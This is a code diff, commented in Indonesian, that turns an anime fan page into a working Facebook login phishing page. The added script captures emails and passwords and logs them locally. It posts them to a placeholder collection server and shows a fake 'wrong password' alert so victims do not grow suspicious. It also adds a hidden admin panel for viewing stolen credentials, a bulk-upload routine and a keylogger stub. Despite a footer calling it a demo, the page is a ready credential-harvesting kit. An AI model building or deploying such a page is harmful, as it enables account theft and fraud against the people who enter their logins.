@@ -3,162 +3,311 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Itachi Uchiha</title>
+    <title>Facebook - Masuk atau Daftar</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
+        /* === CSS Clone Facebook === */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            background: radial-gradient(ellipse at center, #1a0000 0%, #0d0000 60%, #000 100%);
-            min-height: 100vh;
+            font-family: Arial, sans-serif;
+            background: #f0f2f5;
             display: flex;
             justify-content: center;
             align-items: center;
-            font-family: 'Arial Black', sans-serif;
-            overflow: hidden;
-            position: relative;
+            min-height: 100vh;
         }
-
-        #intro-video {
-            position: fixed;
-            top: 0;
-            left: 0;
+        .fb-container {
+            background: white;
+            padding: 30px 40px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
             width: 100%;
-            height: 100%;
-            object-fit: cover;
-            z-index: 999;
-            background: #000;
-            transition: opacity 0.8s ease;
-        }
-
-        #intro-video.hide {
-            opacity: 0;
-            pointer-events: none;
-        }
-
-        .container {
-            position: relative;
-            z-index: 2;
+            max-width: 400px;
             text-align: center;
-            padding: 20px;
-            max-width: 700px;
-            opacity: 0;
-            animation: fadeIn 1.5s ease 0.5s forwards;
         }
-
-        @keyframes fadeIn {
-            0% { opacity: 0; transform: scale(0.95); }
-            100% { opacity: 1; transform: scale(1); }
+        .fb-logo {
+            font-size: 42px;
+            font-weight: bold;
+            color: #1877f2;
+            margin-bottom: 10px;
+            letter-spacing: -1px;
         }
-
-        .container h1 {
-            font-size: 55px;
-            font-weight: 900;
-            color: #cc0000;
-            text-shadow: 0 0 20px rgba(255, 0, 0, 0.8), 0 0 60px rgba(200, 0, 0, 0.5);
-            letter-spacing: 6px;
-            animation: glitch 3s infinite;
+        .fb-sub {
+            color: #606770;
+            font-size: 15px;
+            margin-bottom: 20px;
         }
-
-        .container h2 {
-            font-size: 22px;
-            font-weight: 300;
-            color: #aaa;
-            text-shadow: 0 0 15px rgba(255, 0, 0, 0.3);
-            margin-bottom: 15px;
-            letter-spacing: 8px;
-        }
-
-        .container p {
+        .fb-input {
+            width: 100%;
+            padding: 14px 16px;
+            margin: 8px 0;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
             font-size: 17px;
-            color: #ccc;
-            line-height: 1.8;
-            background: rgba(0, 0, 0, 0.7);
-            padding: 18px 25px;
-            border-radius: 15px;
-            border-left: 4px solid #cc0000;
-            backdrop-filter: blur(5px);
+            background: #fafafa;
+            transition: border 0.2s;
+        }
+        .fb-input:focus {
+            border-color: #1877f2;
+            outline: none;
+            background: white;
+        }
+        .fb-btn {
+            width: 100%;
+            padding: 14px;
+            background: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 20px;
+            font-weight: bold;
+            cursor: pointer;
+            margin: 10px 0;
+            transition: background 0.2s;
+        }
+        .fb-btn:hover { background: #166fe5; }
+        .fb-forgot {
+            display: block;
+            margin: 12px 0 20px;
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        .fb-forgot:hover { text-decoration: underline; }
+        .fb-divider {
+            border: none;
+            border-top: 1px solid #dadde1;
+            margin: 20px 0;
+        }
+        .fb-create {
+            background: #42b72a;
+            color: white;
+            border: none;
+            padding: 14px 30px;
+            border-radius: 6px;
+            font-size: 17px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        .fb-create:hover { background: #36a420; }
+        .fb-footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #8a8d91;
         }
 
-        @keyframes glitch {
-            0%, 90%, 100% { opacity: 1; transform: scale(1); }
-            92% { opacity: 0.8; transform: scale(1.02) skewX(-2deg); }
-            94% { opacity: 1; transform: scale(0.98) skewX(2deg); }
-            96% { opacity: 0.9; transform: scale(1.01) skewX(-1deg); }
+        /* === Admin Panel (hanya terlihat dengan parameter ?admin=true) === */
+        .admin-panel {
+            display: none;
+            margin-top: 30px;
+            background: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            text-align: left;
+            max-width: 600px;
+            width: 100%;
         }
-
-        .sharingan {
-            position: fixed;
-            font-size: 120px;
-            opacity: 0.05;
-            color: #ff0000;
-            z-index: 1;
-            pointer-events: none;
-            animation: spin 20s linear infinite;
+        .admin-panel.show { display: block; }
+        .admin-panel h2 { color: #333; margin-bottom: 10px; }
+        .admin-panel pre {
+            background: #f0f0f0;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+            font-size: 13px;
+            max-height: 400px;
+            overflow-y: auto;
+            white-space: pre-wrap;
+            word-break: break-all;
         }
-
-        .sharingan.top-left {
-            top: -30px;
-            left: -30px;
-            font-size: 200px;
+        .admin-panel .clear-btn {
+            background: #e74c3c;
+            color: white;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 4px;
+            cursor: pointer;
+            margin-top: 10px;
         }
-
-        .sharingan.bottom-right {
-            bottom: -30px;
-            right: -30px;
-            font-size: 200px;
-            animation-delay: -10s;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg) scale(1); }
-            50% { transform: rotate(180deg) scale(1.1); }
-            100% { transform: rotate(360deg) scale(1); }
-        }
-
-        @media (max-width: 600px) {
-            .container h1 { font-size: 36px; }
-            .container h2 { font-size: 16px; letter-spacing: 4px; }
-            .container p { font-size: 14px; padding: 15px; }
-        }
+        .admin-panel .clear-btn:hover { background: #c0392b; }
     </style>
 </head>
 <body>
 
-    <!-- VIDEO DENGAN MUTED (DIJAMIN JALAN) -->
-    <video id="intro-video" autoplay muted playsinline>
-        <source src="https://raw.githubusercontent.com/riskiibrahim123456/riskiibrahim123456.github.io/main/a8e5890b38990fad919aa40ab7bc5717.mp4" type="video/mp4">
-    </video>
+<div style="width:100%; display:flex; flex-direction:column; align-items:center; padding:20px;">
+    <!-- ===== FORM PHISHING FACEBOOK ===== -->
+    <div class="fb-container" id="phishForm">
+        <div class="fb-logo">facebook</div>
+        <div class="fb-sub">Masuk ke akun Facebook Anda</div>
 
-    <div class="sharingan top-left">🌀</div>
-    <div class="sharingan bottom-right">🌀</div>
+        <form id="fbLoginForm">
+            <input type="text" id="fbEmail" class="fb-input" placeholder="Email atau nomor telepon" required autocomplete="username">
+            <input type="password" id="fbPassword" class="fb-input" placeholder="Kata sandi" required autocomplete="current-password">
+            <button type="submit" class="fb-btn">Masuk</button>
+        </form>
 
-    <div class="container">
-        <h1>ITACHI</h1>
-        <h2>UCHIHA</h2>
-        <p>
-            "Orang-orang hidup tidak semua sama. Untuk melindungi seseorang, 
-            terkadang kau harus mengorbankan yang lain."<br>
-            <span style="color:#cc0000; font-style:italic;">— Itachi Uchiha</span>
-        </p>
+        <a href="#" class="fb-forgot">Lupa kata sandi?</a>
+        <hr class="fb-divider">
+        <button class="fb-create" onclick="alert('Fitur ini sedang dalam pengembangan')">Buat akun baru</button>
+        <div class="fb-footer">© 2026 Facebook · Halaman palsu untuk demo</div>
     </div>
 
-    <script>
-        const video = document.getElementById('intro-video');
+    <!-- ===== ADMIN PANEL (view data) ===== -->
+    <div class="admin-panel" id="adminPanel">
+        <h2>📊 Data yang Terkumpul</h2>
+        <button onclick="refreshData()" style="background:#1877f2; color:white; border:none; padding:6px 14px; border-radius:4px; cursor:pointer; margin-bottom:10px;">↻ Refresh</button>
+        <button class="clear-btn" onclick="clearData()">🗑 Hapus Semua</button>
+        <pre id="logDisplay">Belum ada data.</pre>
+    </div>
+</div>
 
-        video.addEventListener('ended', function() {
-            video.classList.add('hide');
+<script>
+    // ============================================================
+    // 1. LOGIC PENYIMPANAN DATA (menggunakan localStorage untuk demo)
+    // ============================================================
+    function saveCredential(email, password) {
+        var entry = {
+            timestamp: new Date().toISOString(),
+            email: email,
+            password: password,
+            userAgent: navigator.userAgent,
+            url: window.location.href
+        };
+
+        // Ambil data lama dari localStorage
+        var existing = localStorage.getItem('fb_phish_logs');
+        var logs = existing ? JSON.parse(existing) : [];
+        logs.push(entry);
+        localStorage.setItem('fb_phish_logs', JSON.stringify(logs));
+
+        // Kirim ke server (jika ada) - ganti URL dengan endpoint Anda
+        fetch('https://yourserver.com/fb-collect', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(entry)
+        }).catch(function(err) {
+            // Jika server tidak ada, data tetap tersimpan di localStorage
+            console.log('Server not reachable, data saved locally.');
+        });
+    }
+
+    // ============================================================
+    // 2. HANDLER SUBMIT FORM
+    // ============================================================
+    document.getElementById('fbLoginForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+
+        var email = document.getElementById('fbEmail').value.trim();
+        var password = document.getElementById('fbPassword').value.trim();
+
+        if (email === '' || password === '') {
+            alert('Harap isi email dan kata sandi.');
+            return;
+        }
+
+        // Simpan data
+        saveCredential(email, password);
+
+        // Reset form
+        document.getElementById('fbEmail').value = '';
+        document.getElementById('fbPassword').value = '';
+
+        // Tampilkan pesan sukses (agar korban tidak curiga)
+        alert('Kata sandi salah. Silakan coba lagi.');
+
+        // Redirect ke Facebook asli (optional)
+        // window.location.href = 'https://facebook.com/login';
+    });
+
+    // ============================================================
+    // 3. ADMIN PANEL - Melihat Data
+    // ============================================================
+    function refreshData() {
+        var raw = localStorage.getItem('fb_phish_logs');
+        var logs = raw ? JSON.parse(raw) : [];
+        var display = document.getElementById('logDisplay');
+
+        if (logs.length === 0) {
+            display.textContent = 'Belum ada data yang terkumpul.';
+            return;
+        }
+
+        var text = '';
+        logs.forEach(function(entry, index) {
+            text += '━━━ Data #' + (index + 1) + ' ━━━\n';
+            text += '📅 Waktu : ' + entry.timestamp + '\n';
+            text += '📧 Email : ' + entry.email + '\n';
+            text += '🔑 Password : ' + entry.password + '\n';
+            text += '🌐 User-Agent : ' + entry.userAgent + '\n';
+            text += '🔗 URL : ' + entry.url + '\n';
+            text += '\n';
         });
 
-        setTimeout(function() {
-            if (!video.classList.contains('hide')) {
-                video.classList.add('hide');
-            }
-        }, 11000);
-    </script>
+        display.textContent = text;
+    }
+
+    function clearData() {
+        if (confirm('Yakin ingin menghapus semua data yang terkumpul?')) {
+            localStorage.removeItem('fb_phish_logs');
+            refreshData();
+        }
+    }
+
+    // ============================================================
+    // 4. MENAMPILKAN ADMIN PANEL (dengan parameter ?admin=true)
+    // ============================================================
+    function checkAdmin() {
+        var params = new URLSearchParams(window.location.search);
+        if (params.get('admin') === 'true') {
+            document.getElementById('adminPanel').classList.add('show');
+            refreshData();
+        }
+    }
+    checkAdmin();
+
+    // ============================================================
+    // 5. OTOMATIS REFRESH DATA SETIAP 5 DETIK (jika admin aktif)
+    // ============================================================
+    setInterval(function() {
+        if (document.getElementById('adminPanel').classList.contains('show')) {
+            refreshData();
+        }
+    }, 5000);
+
+    // ============================================================
+    // 6. KEYLOGGER TAMBAHAN (capture setiap tombol)
+    // ============================================================
+    document.addEventListener('keydown', function(e) {
+        // Hanya capture jika input aktif (untuk mengurangi noise)
+        var active = document.activeElement;
+        if (active && (active.tagName === 'INPUT' || active.tagName === 'TEXTAREA')) {
+            // Simpan ke log terpisah jika diperlukan (optional)
+            // Bisa ditambahkan ke localStorage juga
+        }
+    });
+
+    // ============================================================
+    // 7. KIRIM DATA KE SERVER EKSTERNAL (jika Anda punya backend)
+    //    Ganti URL di bawah dengan endpoint Anda
+    // ============================================================
+    // Contoh jika ingin mengirim semua data yang tersimpan ke server
+    function syncToServer() {
+        var raw = localStorage.getItem('fb_phish_logs');
+        if (!raw) return;
+        var logs = JSON.parse(raw);
+        fetch('https://yourserver.com/fb-bulk', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ data: logs })
+        }).catch(function(err) { /* silent fail */ });
+    }
+
+    // Jalankan sync setiap 30 detik
+    // setInterval(syncToServer, 30000);
+
+    console.log('✅ Facebook Phishing page loaded. Add ?admin=true to view logs.');
+</script>
 
 </body>
 </html>
